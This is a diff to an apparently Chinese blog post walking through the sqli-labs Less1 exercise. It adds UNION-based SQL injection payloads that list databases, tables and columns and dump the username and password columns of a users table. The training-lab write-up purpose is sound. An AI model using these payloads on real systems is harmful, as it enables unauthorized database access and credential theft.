@@ -357,14 +357,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    677
+                    773
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    3 分
                 </div>
                 
 
@@ -430,7 +430,7 @@
 </li>
 </ul>
 <p>搭建环境中请使用PHP7以下的版本，MySQL使用5.5以上版本</p>
-<h3 id="实战思路"><a href="#实战思路" class="headerlink" title="实战思路"></a>实战思路</h3><h4 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h4><p>Error based - Single quotes - String 基于错误-单引号-字符串注入</p>
+<h3 id="实战思路"><a href="#实战思路" class="headerlink" title="实战思路"></a>实战思路</h3><h4 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h4><p><em>Error based - Single quotes - String 基于错误-单引号-字符串注入</em></p>
 <pre class="line-numbers language-none"><code class="language-none">排除数值型注入：
 ?id&#x3D;1&#39; and 1 &#x3D; 1 # 	&#x2F;&#x2F;页面正常回显
 ?id&#x3D;1&#39; and 1 &#x3D; 2 # 	&#x2F;&#x2F;页面正常回显
@@ -446,14 +446,32 @@
 判断页面回显结果位置： （传入不存在的id数值）
 ?id&#x3D;77&#39; union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>在判断完基本信息后我们需要对目标数据库具体库、表、字段、数据进行渗透</p>
+<p>在判断完基本信息后我们需要对目标数据库具体库、表、字段、数据进行猜解</p>
 <p>引入知识点：<a href="/2021/06/08/SQL%E6%B3%A8%E5%85%A5-%E5%88%A9%E7%94%A8information-schema%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%B0%E6%8D%AE">利用information_schema获取目标数据库数据</a></p>
+<p><strong>查询数据库:</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">查看当前网页调用的数据库：
 ?id&#x3D;77&#39; union select 1,2,database()--+
 
-查询当前数据库下所有的表：
-?id&#x3D;77&#39; union select 1,2,group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA&#x3D;database()--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+查看所有的数据库：
+?id&#x3D;77&#39; union select 1,2,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<p><img src="https://gitee.com/night7i/img/raw/master/img/20210608105545.png" alt="网站当前使用数据库"></p>
+<p><img src="https://gitee.com/night7i/img/raw/master/img/20210608105535.png" alt="站点所有数据库"></p>
+<p><strong>查询数据表:</strong></p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">查询当前数据库下所有的表：
+?id&#x3D;77&#39; union select 1,2,group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA&#x3D;database()--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/night7i/img/raw/master/img/20210608105729.png" alt="security数据库所有表"></p>
+<p><strong>查询字段:</strong></p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">查询users表内所有字段：
+?id&#x3D;77&#39; union select 1,2,group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA&#x3D;database() and TABLE_NAME&#x3D;&#39;users&#39;--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/night7i/img/raw/master/img/20210608110317.png" alt="user表所有字段"></p>
+<p><strong>查询数据:</strong></p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">查询username以及password字段下所有数据：
+?id&#x3D;77&#39; union select 1,group_concat(username),group_concat(password) from users--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/night7i/img/raw/master/img/20210608110628.png" alt="username、password字段所有数据"></p>
 
                 
             </div>
@@ -806,7 +824,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">1.1k</span>&nbsp;字
+                class="white-color">1.3k</span>&nbsp;字
             
             
             
